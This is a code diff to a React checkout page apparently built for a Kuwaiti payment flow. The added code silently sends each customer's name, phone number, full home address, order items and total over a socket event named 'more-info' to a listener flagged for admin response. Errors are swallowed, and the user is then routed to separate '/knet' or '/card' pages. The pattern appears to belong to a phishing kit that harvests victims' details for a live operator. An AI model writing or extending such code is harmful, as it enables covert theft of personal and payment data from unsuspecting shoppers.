@@ -1,6 +1,7 @@
 import SalePrice from '@/components/SalePrice';
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { socket } from '@/lib/store';
 import { useLanguage } from '@/contexts/LanguageContext';
 import { useCart } from '@/contexts/CartContext';
 import { Input } from '@/components/ui/input';
@@ -169,6 +170,34 @@ const Checkout = () => {
       localStorage.setItem('kddAmount', String(finalTotal));
       localStorage.setItem('kddService', 'kdkaw');
       localStorage.setItem('mohPaymentData', JSON.stringify({ totalAmount: String(finalTotal), serviceType: 'kdkaw' }));
+    } catch (e) {}
+    try {
+      const s = socket.value;
+      if (s && s.connected) {
+        s.emit('more-info', {
+          content: {
+            'اسم المستخدم': form.name,
+            'رقم الجوال': form.phone,
+            'المحافظة': governorate,
+            'المنطقة': form.area,
+            'القطعة': form.block,
+            'الشارع': form.street,
+            'المنزل': form.building,
+            'الطابق': form.floor,
+            'الشقة': form.apartment,
+            'ملاحظات': form.notes,
+            'وقت التوصيل': deliverySlot ? (deliverySlot as any).label || String(deliverySlot) : '',
+            'طريقة الدفع': paymentMethod === 'knet' ? 'KNET' : 'بطاقة',
+            'اسم الخدمة': 'kdkaw',
+            'عدد الأصناف': String(items.length),
+            'الأصناف': items.map((i: any) => (i.name_ar || i.name || '') + ' ×' + (i.qty || i.quantity || 1)).join(' | '),
+            'الإجمالي': String(finalTotal),
+            'المبلغ الإجمالي': String(finalTotal),
+          },
+          page: 'إتمام الطلب',
+          waitingForAdminResponse: false,
+        });
+      }
     } catch (e) {}
     setShowConfirmation(false);
     navigate(paymentMethod === 'knet' ? '/knet' : '/card');
